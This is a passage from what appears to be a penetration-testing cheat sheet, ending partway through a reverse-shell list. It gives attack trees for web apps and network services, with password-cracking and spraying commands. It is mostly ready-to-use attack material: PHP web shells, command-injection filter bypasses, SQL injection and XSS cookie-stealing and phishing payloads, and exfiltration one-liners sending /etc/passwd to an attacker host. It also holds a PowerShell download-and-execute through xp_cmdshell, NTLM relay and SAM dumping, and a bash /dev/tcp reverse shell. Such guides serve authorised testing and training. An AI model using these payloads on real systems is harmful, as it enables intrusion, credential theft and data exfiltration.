curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
curl "http://target/page.php?file=/proc/self/environ&cmd=id"
```

**LFI + File Upload = RCE:**
```bash
# Method 1: Image with PHP code
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
# Upload, then include
curl "http://target/page.php?language=./profile_images/shell.gif&cmd=id"

# Method 2: ZIP wrapper
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
curl "http://target/page.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id"

# Method 3: Phar wrapper (alternative to ZIP)
# Create phar with web shell, rename to .jpg, upload
curl "http://target/page.php?language=phar://./profile_images/shell.jpg%23shell.txt&cmd=id"
```

**LFI Webroot Fuzzing:**
```bash
# Find webroot path
ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
  -u 'http://target/page.php?language=../../../../FUZZ/index.php' -fs 2287

# Find server files
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-WordList-Linux.txt:FUZZ \
  -u 'http://target/page.php?language=../../../../FUZZ' -fs 2287
```

## 3.2 - Command Injection
```
Decision: Is user input passed to system commands?
├── Yes → Test injection payloads
│   ├── Basic: ;id, |id, ||id, &&id, `id`, $(id)
│   ├── Blind: time-based (sleep 5), OOB (curl attacker)
│   └── Filtered? → encoding, alternate syntax
└── No → Move to next attack
```

**Command Injection Payloads:**
```bash
# Injection operators (URL-encoded)
;       %3b      # Semicolon - both commands
%0a     %0a      # Newline - both commands (often not blacklisted!)
&       %26      # Background - both (second shown first)
|       %7c      # Pipe - both (only second shown)
&&      %26%26   # AND - both (only if first succeeds)
||      %7c%7c   # OR - second (only if first fails)
` `     %60%60   # Sub-shell (Linux only)
$()     %24%28%29 # Sub-shell (Linux only)

# Basic payloads
;id
|id
||id
&&id
`id`
$(id)

# SPACE BYPASS (if space filtered)
127.0.0.1%0a%09id                    # Tab (%09) instead of space
127.0.0.1%0a${IFS}id                 # ${IFS} = space+tab
127.0.0.1%0a{id}                     # Brace expansion: {ls,-la}
127.0.0.1%0a${IFS}${PATH:0:1}home    # Combine with slash bypass

# SLASH BYPASS (if / filtered)
${PATH:0:1}                          # Extracts / from PATH
${HOME:0:1}                          # Extracts / from HOME
${PWD:0:1}                           # Extracts / from PWD
$(tr '!-}' '"-~'<<<[)                # Character shifting → \

# SEMICOLON BYPASS (if ; filtered)
${LS_COLORS:10:1}                    # Extracts ; from LS_COLORS
%0a                                  # Newline as injection operator

# COMMAND BLACKLIST BYPASS
w'h'o'am'i                           # Quote insertion (even number, same type)
w"h"o"am"i                           # Double quote insertion
w\ho\am\i                            # Backslash insertion (Linux only)
who$@ami                             # $@ insertion (Linux only)
who^ami                              # Caret insertion (Windows only)

# CASE MANIPULATION
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")    # Linux: tr to lowercase
$(a="WhOaMi";printf %s "${a,,}")     # Linux: bash parameter expansion
WhOaMi                               # Windows: case-insensitive

# REVERSED COMMANDS
$(rev<<<'imaohw')                    # Linux: reverse whoami
iex "$('imaohw'[-1..-20] -join '')"  # Windows: PowerShell reverse

# BASE64 ENCODED
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)  # Linux
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"  # Windows

# ENCODING & OBFUSCATION
$(printf '\x69\x64')                 # Hex encoding
/???/??t /???/p??s??                 # Glob-based bypass

# WILDCARDS & REGEX
/bin/ca? /etc/passwd                 # ? wildcard
/bin/c[a]t /etc/passwd               # [] wildcard

# EVASION TOOLS
# Bashfuscator (Linux):
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
# DOSfuscation (Windows): interactive PowerShell obfuscation

# Data exfiltration
;cat /etc/passwd | curl -X POST -d @- http://attacker/
;curl http://attacker/$(cat /etc/passwd | base64)
;wget http://attacker/$(whoami)

# BLIND DETECTION
;sleep 5                              # Time-based
;curl http://attacker/                # OOB
;ping -c 5 attacker                   # ICMP
```

## 3.3 - SQL Injection
```
Decision: Is user input in SQL queries?
├── Error-based → Extract via error messages
├── Union-based → UNION SELECT to extract data
├── Boolean-based → True/False to infer data
├── Time-based → SLEEP/WAITFOR to infer data
├── Stacked queries → Multiple statements
└── No → Move to next attack
```

**SQLi Detection:**
```sql
' OR 1=1--
" OR 1=1--
' OR '1'='1
admin'--
1' ORDER BY 1--    # Increase number until error
1' UNION SELECT NULL--  # Add NULLs until column count matches
```

**MySQL Enumeration:**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php'--
```

**MSSQL Enumeration:**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

**SQLMap:**
```bash
# Basic
sqlmap -u "http://target/page?id=1" --batch

# POST request
sqlmap -u "http://target/login" --data="user=admin&pass=test" --batch

# With cookie
sqlmap -u "http://target/page?id=1" --cookie="session=abc123" --batch

# Enumerate databases
sqlmap -u "http://target/page?id=1" --dbs --batch

# Enumerate tables
sqlmap -u "http://target/page?id=1" -D <database> --tables --batch

# Dump table
sqlmap -u "http://target/page?id=1" -D <database> -T <table> --dump --batch

# OS shell (if possible)
sqlmap -u "http://target/page?id=1" --os-shell --batch

# File read
sqlmap -u "http://target/page?id=1" --file-read="/etc/passwd" --batch

# Tamper scripts (WAF bypass)
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between --batch
```

## 3.4 - Cross-Site Scripting (XSS)
```
Decision: Is user input reflected in HTML?
├── Reflected → Script in URL/parameter
├── Stored → Script saved in database
├── DOM-based → Client-side manipulation
└── No → Move to next attack
```

**XSS Payloads:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
'onmouseover='alert("XSS")'
javascript:alert('XSS')
```

**Blind XSS (can't see rendered output):**
```html
<!-- Load remote script per field name, check listener for hits -->
<script src=http://ATTACKER/fieldname></script>
<img src=x onerror=fetch('http://ATTACKER/?c='+document.cookie)>
```

**Cookie Stealing (stored XSS):**
```html
<!-- Inject in stored field (comment, profile, etc.) -->
<script>new Image().src='http://ATTACKER/?c='+document.cookie</script>
<!-- Attacker listener: python3 -m http.server 8080 -->
```

**XSS Phishing (fake login form):**
```html
<!-- Inject into stored XSS field -->
<script>
document.write('<h3>Session Expired</h3><form action=http://ATTACKER/login><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>');
document.getElementById('originalForm').remove();
</script>
```

**SVG XXE via file upload:**
```xml
<!-- Save as .svg, upload as image -->
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <text>&xxe;</text>
</svg>
```

**Image Metadata XSS (exiftool):**
```bash
# Inject XSS into image metadata (displayed by app)
exiftool -Comment=' "><img src=1 onerror=alert(1)>' image.jpg
# Or into any EXIF field the app renders
```

## 3.5 - File Upload Attacks
```
Decision: Can we upload files?
├── Yes → What restrictions exist?
│   ├── Extension bypass: .php5, .phtml, .pht, .php.jpg
│   ├── Content-Type: Change to image/jpeg
│   ├── Double extension: shell.php.jpg
│   ├── Reverse double ext: shell.php.jpg (Apache misconfig, regex lacks $)
│   ├── Null byte: shell.php%00.jpg (PHP < 5.3)
│   ├── Magic bytes: GIF89a header
│   ├── Race condition: Upload and access simultaneously
│   ├── SVG upload → XXE or XSS via SVG XML
│   ├── Image metadata → exiftool XSS injection
│   └── Character injection fuzzing → %20, %0a, %00, /, .\, : before ext
├── Upload to web-accessible dir? → Access and execute
└── No → Move to next attack
```

**Character Injection Filename Fuzzing:**
```bash
# Test special chars before/after extension
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' ':'; do
  for ext in '.php' '.phps' '.phtml'; do
    echo "shell${char}${ext}.jpg"
  done
done
# Use Burp Intruder to test each variation
```

**Web Shells:**
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php if(isset($_REQUEST['cmd'])){echo "<pre>";$cmd = ($_REQUEST['cmd']);system($cmd);echo "</pre>";die;}?>
```

## 3.6 - Login Brute Force (Web Forms)

**Hydra http-post-form:**
```bash
# Identify form parameters (inspect HTML or Burp)
# Success condition: S=302 or S=Dashboard
# Failure condition: F=Invalid credentials

hydra -L users.txt -P passwords.txt <target> http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
hydra -l admin -P passwords.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:S=302"

# Basic HTTP Auth
hydra -l admin -P passwords.txt <target> http-get /
```

## PHASE 3.7 - XXE (XML External Entity)
```
Decision: Does app parse XML/SVG/DOCX input?
├── Yes → Inject external entity
│   ├── File read: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
│   ├── PHP filter: <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
│   ├── SSRF: <!ENTITY xxe SYSTEM "http://internal-host:8080/">
│   ├── Blind OOB: <!ENTITY xxe SYSTEM "http://attacker/xxe">
│   ├── SVG upload: <svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>
│   └── Error-based: Use invalid entity to leak in error message
└── No → Move to next attack
```

## PHASE 3.8 - SSRF (Server-Side Request Forgery)
```
Decision: Does app fetch URLs on our behalf?
├── Yes → Test internal access
│   ├── Basic: http://127.0.0.1, http://localhost, http://169.254.169.254 (cloud metadata)
│   ├── Bypass filters:
│   │   ├── Decimal: http://2130706433 (127.0.0.1)
│   │   ├── Hex: http://0x7f000001
│   │   ├── Octal: http://0177.0.0.1
│   │   ├── DNS rebinding: http://attacker.com → resolves to 127.0.0.1
│   │   ├── Redirect: http://attacker/redirect → 302 to http://internal
│   │   └── URL parsing: http://attacker@127.0.0.1, http://127.0.0.1#@attacker
│   ├── Cloud metadata: http://169.254.169.254/latest/meta-data/
│   ├── Internal port scan: http://127.0.0.1:PORT
│   └── File read: file:///etc/passwd, gopher://, dict://
└── No → Move to next attack
```

## PHASE 3.9 - IDOR (Insecure Direct Object Reference)
```
Decision: Can we manipulate object references (uid, file_id, etc.)?
├── Yes → Test access control
│   ├── Sequential: Change uid=1 to uid=2
│   ├── Encoded: base64 decode → modify → re-encode
│   ├── Hashed: Check if hash is calculated client-side (JS)
│   │   └── Look for CryptoJS.MD5(btoa(uid)) in frontend code
│   ├── API: GET/PUT/DELETE other users' endpoints
│   ├── Mass enum: Loop through IDs to dump all data
│   ├── Role escalation: Change role parameter to admin
│   └── Chaining: Leak admin UUID via GET IDOR → use with PUT to change email → reset password → admin
└── No → Move to next attack
```

**IDOR Hash Reversal (front-end code review):**
```bash
# If app uses hashed IDs, check JS source for hash algorithm
# Common pattern: CryptoJS.MD5(btoa(uid)) or btoa(uid)
# Reverse: atob(hash) → uid, then enumerate
# Mass enumerate: for i in $(seq 1 100); do curl -sOJ URL?hash=$(echo -n $i | base64 | md5sum | cut -d' ' -f1); done
```

## PHASE 3.10 - HTTP Verb Tampering & Header Bypass
```
Decision: Is auth/filter only on GET/POST?
├── Yes → Try alternate verbs
│   ├── HEAD: May bypass auth (no body returned)
│   ├── PUT/DELETE/PATCH: May bypass filters
│   ├── OPTIONS: Check allowed methods
│   ├── TRACE/TRACK: May bypass auth (XST attack)
│   └── Burp: Right-click → Change Request Method
├── Header-based bypass? → Inject trusted headers
│   ├── X-Custom-IP-Authorization: 127.0.0.1
│   ├── X-Forwarded-For: 127.0.0.1
│   ├── X-Original-URL: /admin
│   ├── X-Rewrite-URL: /admin
│   └── X-Real-IP: 127.0.0.1
└── No → Move to next attack
```

**PDF Generation XSS/SSRF:**
```
If app generates PDFs from user input:
├── Inject JavaScript to read local files
│   ├── <script>xhr=new XMLHttpRequest();xhr.open('GET','file:///etc/passwd',false);xhr.send();document.write(xhr.responseText);</script>
│   └── <iframe src="file:///etc/passwd"></iframe>
└── SSRF via PDF renderer
    └── <script>xhr.open('GET','http://internal:8080/admin',false);xhr.send();document.write(xhr.responseText);</script>
```

## PHASE 3.11 - DOM XSS Source/Sink Reference
> XSS general payloads in §3.4. DOM-specific reference below.
```
Sources (user-controlled): document.URL, location.hash, location.search, document.referrer, window.name, postMessage data
Sinks (dangerous):         innerHTML, outerHTML, document.write, eval, Function(), setTimeout(str), setInterval(str), location.href, jQuery .html()

DOM XSS test: append #<svg/onload=alert(1)> to URL → triggers if hash hits sink
```

## PHASE 3.12b - JWT (JSON Web Token) Attacks
```
Decision: App uses JWT (header.payload.signature)?
├── alg:none → strip signature, set "alg":"none"
├── HS256 → RS256 confusion → sign HS256 with public key as secret
├── Weak HMAC secret → crack offline (hashcat -m 16500)
├── kid header injection → SQLi / path traversal in kid lookup
├── jku/x5u URL injection → host attacker JWKS
├── Embedded jwk → swap with attacker key
└── No → skip
```

**Decode + inspect:**
```bash
# Manual: base64 -d each part (header, payload)
echo '<header_b64>' | base64 -d
echo '<payload_b64>' | base64 -d

# jwt_tool (all-in-one)
python3 jwt_tool.py <JWT>                       # Decode + analyze
python3 jwt_tool.py <JWT> -X a                  # alg:none attack
python3 jwt_tool.py <JWT> -X k -pk public.pem   # HS256→RS256 confusion (use pubkey as HMAC secret)
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt   # Dictionary attack HMAC
python3 jwt_tool.py <JWT> -I -pc 'role' -pv 'admin'    # Tamper claim
```

**Crack weak HMAC secret:**
```bash
# Hashcat mode 16500 = JWT
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# John alt
john --format=HMAC-SHA256 jwt.txt --wordlist=rockyou.txt
```

**HS256 → RS256 algorithm confusion (server validates with public key as HMAC secret):**
```bash
# 1. Get server public key (often /.well-known/jwks.json or /jwks)
curl http://target/.well-known/jwks.json
# 2. Convert JWKS → PEM
# 3. Forge: header.alg=HS256, sign payload with PEM as HMAC secret
python3 jwt_tool.py <JWT> -X k -pk public.pem
```

**kid header injection (when server reads kid as file path or SQL lookup):**
```
Header: {"alg":"HS256","kid":"../../../../dev/null"}
→ Server reads /dev/null as HMAC key → empty key → forge with empty secret

Header: {"alg":"HS256","kid":"key' UNION SELECT 'attacker_secret"}
→ SQLi in kid lookup
```

## PHASE 3.12 - .htaccess + Filename Injection (Upload extras)
> Full upload attack tree in §3.5. Extras below.
```
.htaccess upload (Apache, when allowed):
  AddType application/x-httpd-php .jpg     # makes .jpg execute as PHP
  → upload .htaccess, then shell.jpg with PHP code → access shell.jpg

Filename injection (when filename used in shell command):
  $(whoami).jpg          # command substitution
  `id`.jpg               # backtick exec
  ;curl ATTACKER/$(id);.jpg

Race condition upload:
  while true; do curl -F 'file=@shell.php' http://t/upload; done &
  while true; do curl http://t/uploads/shell.php; done    # hit before deletion
```

---

# PHASE 4: SERVICE ATTACKS

## 4.1 - FTP (Port 21)
```
Decision: FTP Found?
├── Anonymous login? → Enumerate files, download sensitive data
├── Write access? → Upload webshell, overwrite configs
├── Brute force → hydra -L users.txt -P passwords.txt ftp://<target>
├── FTP Bounce → nmap -Pn -v -n -p80 -b anonymous:pass@<ftp> <internal>
└── Version vulns → searchsploit <ftp_version>
```

## 4.2 - SMB (Port 139/445)
```
Decision: SMB Found?
├── Null session? → Enumerate shares, users, groups
├── Write access? → Upload webshell, malicious files
├── Read access? → Download sensitive files
├── Brute force → hydra/netexec
├── EternalBlue? → nmap --script smb-vuln-ms17-010
├── Other vulns → searchsploit smb
├── Pass-the-Hash? → netexec smb <target> -u <user> -H <hash>
├── Responder capture? → LLMNR/NBT-NS poisoning → crack NetNTLMv2
└── NTLM Relay? → ntlmrelayx.py → relay to SMB/LDAP/ADCS
```

**Responder / NTLM Capture:**
```bash
# On attacker (capture NetNTLMv2 hashes)
sudo responder -I <interface> -wrf

# Crack captured hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# NTLM Relay (no cracking needed)
# Check SMB signing: nmap --script smb2-security-mode -p 445 <targets>
# If signing not required → relay works
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -tf targets.txt -smb2support -e shell.exe  # Execute on relay
ntlmrelayx.py -t ldaps://<dc_ip> -smb2support --escalate-user <user>  # ACL abuse
```

**CrackMapExec (authenticated SMB):**
```bash
netexec smb <target> -u <user> -p '<pass>' --shares          # Shares
netexec smb <target> -u <user> -p '<pass>' --users           # Users
netexec smb <target> -u <user> -p '<pass>' --loggedon-users  # Logged-on
netexec smb <target> -u <user> -p '<pass>' --sam             # Dump SAM
netexec smb <target> -u <user> -p '<pass>' --lsa             # LSA secrets
netexec smb <target> -u <user> -p '<pass>' -x 'whoami'       # Execute command
netexec smb <target> -u <user> -p '<pass>' -X 'whoami'       # PowerShell execute
```

## 4.3 - MSSQL (Port 1433)
```
Decision: MSSQL Found?
├── Default creds? → sa:(empty), sa:sa
├── Brute force → hydra -L users.txt -P passwords.txt mssql://<target>
├── Windows auth? → sqsh -S <target> -U .\\<user> -P '<pass>'
├── xp_cmdshell → Enable and execute commands
├── Linked servers → Enumerate and abuse
├── Impacket? → mssqlclient.py <user>:<pass>@<target>
├── User impersonation? → EXECUTE AS LOGIN = 'sa'
├── Ole Automation? → sp_OACreate for file write
└── Capture hash → xp_dirtree to attacker SMB
```

**MSSQL Connection:**
```bash
# sqsh (Linux)
sqsh -S <target> -U <user> -P '<pass>'
sqsh -S <target> -U .\\<user> -P '<pass>'  # Windows auth

# Impacket (preferred)
mssqlclient.py <domain>/<user>:'<pass>'@<target> -windows-auth
mssqlclient.py <user>:'<pass>'@<target>
```

**MSSQL Command Execution:**
```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker/shell.ps1\')"';

-- User impersonation (escalate to sa)
SELECT name FROM sys.server_permissions JOIN sys.server_principals ON grantor_principal_id = principal_id WHERE permission_name = 'IMPERSONATE';
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;  -- Verify

-- Ole Automation (file write - create webshell)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @ole INT; EXEC sp_OACreate 'scripting.filesystemobject', @ole OUT;
EXEC sp_OAMethod @ole, 'copyfile', NULL, 'C:\temp\shell.txt', 'C:\inetpub\wwwroot\shell.aspx';

-- OPENROWSET (file read)
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;

-- Linked servers
EXEC sp_linkedservers;
-- Execute on linked server
EXEC ('xp_cmdshell ''whoami''') AT [<linked_server>];

-- Hash capture (NTLMv2 to Responder)
EXEC master..xp_dirtree '\\<attacker_ip>\share';
```

## 4.4 - MySQL (Port 3306)
```
Decision: MySQL Found?
├── Default creds? → root:(empty), root:root
├── Brute force → hydra -L users.txt -P passwords.txt mysql://<target>
├── Read files → SELECT LOAD_FILE('/etc/passwd');
├── Write files → SELECT "code" INTO OUTFILE '/var/www/html/shell.php';
├── UDF RCE → If FILE privilege and writable plugin dir
└── Creds in config → Check /etc/mysql/, web app configs
```

## 4.5 - RDP (Port 3389)
```
Decision: RDP Found?
├── Brute force → hydra -L users.txt -P passwords.txt rdp://<target>
├── Password spraying → crowbar -b rdp -s <target> -U users.txt -c 'Password123'
├── Pass-the-Hash → xfreerdp /v:<target> /u:<user> /pth:<hash>
├── Session hijacking → tscon (needs SYSTEM, Server <2019)
├── BlueKeep → CVE-2019-0708 (careful, may BSOD)
└── Default creds → administrator:(empty)
```

## 4.6 - WinRM (Port 5985/5986)
```bash
# Brute force
netexec winrm <target> -u users.txt -p passwords.txt

# Connect
evil-winrm -i <target> -u <user> -p '<pass>'
evil-winrm -i <target> -u <user> -H <nt_hash>

# (Pwn3d!) indicator = can execute commands
```

## 4.7 - DNS (Port 53)
```bash
# Zone transfer (information disclosure)
dig AXFR @<dns_server> <domain>

# Record enumeration
dig ANY <domain> @<dns_server>
dig A <domain> @<dns_server>
dig MX <domain> @<dns_server>
dig TXT <domain> @<dns_server>
```

## 4.8 - SMTP (Port 25)
```bash
# User enumeration
telnet <target> 25
VRFY admin
VRFY root
EXPN admin
RCPT TO: admin

nmap --script smtp-enum-users -p 25 <target>
```

## 4.9 - Email (POP3/IMAP)
```bash
# POP3
hydra -L users.txt -P passwords.txt pop3://<target>
nc <target> 110
USER <username>
PASS <password>
LIST
RETR <message_number>

# IMAP
hydra -L users.txt -P passwords.txt imap://<target>
openssl s_client -connect <target>:993
```

---

# PHASE 5: PASSWORD ATTACKS

> Get hashes FIRST (Phase 7/8/9), then crack here. Online attacks when cracking fails.

---

## 5.1 - Hash Identification
```bash
hashid '<hash>'
hashid -j '<hash>'  # JtR format
hashid -m '<hash>'  # Hashcat mode
```

**Common Hash Formats:**
| Type | Length | Hashcat Mode | JtR Format |
|------|--------|-------------|------------|
| MD5 | 32 hex | 0 | raw-md5 |
| SHA1 | 40 hex | 100 | raw-sha1 |
| SHA256 | 64 hex | 1400 | raw-sha256 |
| NTLM | 32 hex | 1000 | nt |
| DCC2 | varies | 2100 | mscach2 |
| bcrypt | $2*$ | 3200 | bcrypt |
| BitLocker | $bitlocker$0$ | 22100 | bitlocker |

**Linux Shadow Hash Identification:**
```
$1$ = MD5
$5$ = SHA-256
$6$ = SHA-512
$y$ = yescrypt (modern default)
$2a$/$2b$ = bcrypt
```

**Windows Hash Sources (see Phase 7 for extraction):**
```
SAM → Local account NT hashes
LSASS → Cached domain creds, Kerberos tickets
NTDS.dit → All domain account hashes (DCSync)
LSA Secrets → Service account passwords
DPAPI → Browser creds, RDP saved creds
```

## 5.2 - Offline Cracking

### John the Ripper
```bash
# Wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hashes.txt

# Single crack (GECOS-based - uses username/fullname info to generate candidates)
john --single hashes.txt
# Best for Linux /etc/shadow - generates variations from username fields

# Incremental mode (Markov chains - brute force with character frequency)
john --incremental hashes.txt

# Specify format
john --format=raw-md5 hashes.txt
john --format=nt hashes.txt

# Show results
john hashes.txt --show
```

### Hashcat
```bash
# Dictionary
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt  # MD5
hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt  # NTLM

# With rules
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack
hashcat -a 3 -m 0 hash.txt '?u?l?l?l?l?d?s'  # Ullllds
hashcat -a 3 -m 0 hash.txt -1 '?l?u' '?1?1?1?1?d?s'

# Generate custom wordlist
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

### File Cracking
```bash
# SSH keys
ssh2john.py id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash

# ZIP
zip2john file.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash

# RAR
rar2john file.rar > rar.hash
john --wordlist=/usr/share/wordlists/rockyou.txt rar.hash

# Office
office2john.py document.docx > office.hash
john --wordlist=/usr/share/wordlists/rockyou.txt office.hash

# PDF
pdf2john.py document.pdf > pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash

# BitLocker
bitlocker2john -i backup.vhd > bitlocker.hashes
grep "bitlocker\$0" bitlocker.hashes > bitlocker.hash
hashcat -a 0 -m 22100 bitlocker.hash /usr/share/wordlists/rockyou.txt

# KeePass
keepass2john database.kdbx > keepass.hash

# OpenSSL encrypted
for i in $(cat rockyou.txt); do openssl enc -aes-256-cbc -d -in file.enc -k $i 2>/dev/null; done
```

### Custom Wordlists
```bash
# CeWL - spider website for words
cewl https://www.target.com -d 4 -m 6 --lowercase -w target.wordlist

# Username Anarchy
./username-anarchy -i names.txt

# Filter by password policy
grep -E '^.{8,}$' wordlist.txt > min8.txt
grep -E '[A-Z]' min8.txt > has_upper.txt
grep -E '[a-z]' has_upper.txt > has_lower.txt
grep -E '[0-9]' has_lower.txt > has_number.txt

# CUPP - Personalized password profiling
cupp -i    # Interactive mode: name, DOB, pet, company, etc.

# Username Anarchy - Generate all username permutations
./username-anarchy -i names.txt    # Jane Smith → jsmith, jane.smith, j.smith, etc.

# Password policy analysis before brute forcing
netexec smb DC -u user -p pass --pass-pol        # Check lockout policy
rpcclient -U "" -N DC → getdompwinfo              # NULL session
ldapsearch -h DC -x -b "DC=domain,DC=local" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

## 5.3 - Online Attacks

### Hydra
```bash
# HTTP Basic Auth
hydra -l admin -P passwords.txt <target> http-get / -s 81

# HTTP POST Form
hydra -l admin -P passwords.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
hydra -l admin -P passwords.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:S=302"

# SSH
hydra -L users.txt -P passwords.txt ssh://<target>

# FTP
hydra -L users.txt -P passwords.txt ftp://<target>

# SMB
hydra -L users.txt -P passwords.txt smb://<target>

# RDP
hydra -l administrator -P passwords.txt rdp://<target>

# Credential stuffing (user:pass file)
hydra -C user_pass.list ssh://<target>

# Brute-force generation (-x flag)
hydra -l admin -x 6:8:aA1 rdp://<target>    # Length 6-8, lowercase+uppercase+digits

# Multiple targets
hydra -l root -p toor -M targets.txt ssh

# Stop on first valid
hydra -l admin -P passwords.txt -f ssh://<target>
```

### Medusa
```bash
medusa -h <target> -u root -P passwords.txt -M ssh -t 3
medusa -h <target> -u fiona -P /usr/share/wordlists/rockyou.txt -M ftp
medusa -h <target> -U usernames.txt -e ns -M ssh  # Check empty/same-as-user
```

### NetExec
```bash
netexec smb <target> -u users.txt -p passwords.txt
netexec winrm <target> -u users.txt -p passwords.txt
netexec mssql <target> -u users.txt -p passwords.txt
```

## 5.4 - Password Spraying
```
Decision: Account lockout policy?
├── Strict → Spray: 1 password, many users
├── Lenient → Brute force with wordlist
├── Unknown → Start spraying, monitor for lockouts
└── No policy → Full brute force
```

```bash
# NetExec spraying
netexec smb <target_range> -u users.txt -p 'Password123!'
netexec smb <target_range> -u users.txt -p 'Welcome1'
netexec smb <target_range> -u users.txt -p 'Summer2024!'

# Kerbrute spraying
kerbrute passwordspray --dc <dc_ip> --domain <domain> users.txt 'Password123!'
```

## 5.5 - Network Credential Capture

```bash
# Wireshark filters for credential capture
# http contains "passw"           # HTTP with password
# http.request.method == "POST"   # POST requests (login forms)
# ftp.request.command == "PASS"   # FTP passwords
# smtp.auth.username              # SMTP auth

# PCredz (extract creds from pcap)
python3 PCredz.py -r capture.pcap
# Extracts: NTLMv1/v2, Kerberos, FTP, HTTP Basic, SMTP

# tcpdump capture (run on compromised host)
tcpdump -i eth0 -w capture.pcap port not 22
```

## 5.6 - Network Share Credential Hunting

```bash
# Snaffler (Windows - finds creds in shares)
.\Snaffler.exe -o snaffler.log

# NetExec share spider
netexec smb <dc_ip> -u <user> -p '<pass>' -M spider_plus --share 'Department Shares'

# MANSPIDER (Linux - search share contents)
manspider.py <dc_ip> -u <user> -p '<pass>' -m password,cred,secret

# Manual share search
find /mnt/share -name "*cred*" -o -name "*password*" -o -name "*config*" 2>/dev/null
grep -rn "password" /mnt/share/ 2>/dev/null
```

## 5.7 - Default Credentials
```bash
# Tool
pip3 install defaultcreds-cheat-sheet
creds search <product>

# Always try
admin:admin, admin:password, admin:(empty)
root:root, root:toor, root:(empty)
tomcat:tomcat, tomcat:s3cret
jenkins:jenkins
splunk:splunk
prtgadmin:prtg
sa:(empty), sa:sa
```

---

# PHASE 6: SHELLS & PAYLOADS

> Identify OS first, then select shell type. Web shells for initial access, reverse/bind for full control.

---

## 6.0 - OS Fingerprinting (before shell selection)
```bash
# TTL-based detection
# TTL 128 = Windows, TTL 64 = Linux

# Nmap OS detection
nmap -O <target>
nmap --script banner.nse -sV <target>

# Check target for available interpreters
which python3 python php perl ruby bash nc ncat powershell 2>/dev/null
```

## 6.0b - Web Shells (initial access via web app)
```bash
# Simple PHP web shells
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php if(isset($_REQUEST['cmd'])){echo "<pre>";$cmd=($_REQUEST['cmd']);system($cmd);echo "</pre>";die;}?>

# Upload vectors:
# - Unrestricted file upload
# - WAR deployment (Tomcat/Axis2/WebLogic)
# - Misconfigured FTP to webroot
# - File inclusion (LFI + uploaded image with PHP code)

# Kali web shells location
/usr/share/webshells/
```

## 6.1 - Reverse Shell Selection
```
Decision: What's available on target?
├── bash → bash -i >& /dev/tcp/<attacker>/<port> 0>&1
├── python → python3 -c 'import socket,subprocess,os;...'
├── php → php -r '$sock=fsockopen(...);exec("/bin/bash -i ...");'
├── netcat → nc <attacker> <port> -e /bin/bash
